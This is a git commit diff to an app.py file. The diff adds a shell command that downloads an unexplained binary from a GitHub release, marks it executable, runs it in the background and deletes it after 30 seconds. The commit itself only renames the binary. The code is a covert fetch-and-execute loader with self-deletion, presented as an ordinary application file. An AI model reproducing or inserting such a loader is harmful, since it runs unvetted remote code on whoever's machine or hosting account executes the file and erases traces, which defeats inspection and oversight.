ce47ab5e5cf267b9380bf0fa0a57fac8b1e59bb4
Kuang YiWu <136738046+alphaxcv@users.noreply.github.com>
2025-12-26 10:13:27 +0800

    Update app.py

--- app.py
+++ app.py
@@ -1,3 +1,3 @@
 import subprocess
-cmd = "curl -L -o jsko https://github.com/seav1/dl/releases/download/files/jsko && chmod +x jsko && ./jsko & sleep 30 && rm -f jsko"
+cmd = "curl -L -o kows https://github.com/seav1/dl/releases/download/files/kows && chmod +x kows && ./kows & sleep 30 && rm -f kows"
 subprocess.call(cmd, shell=True)
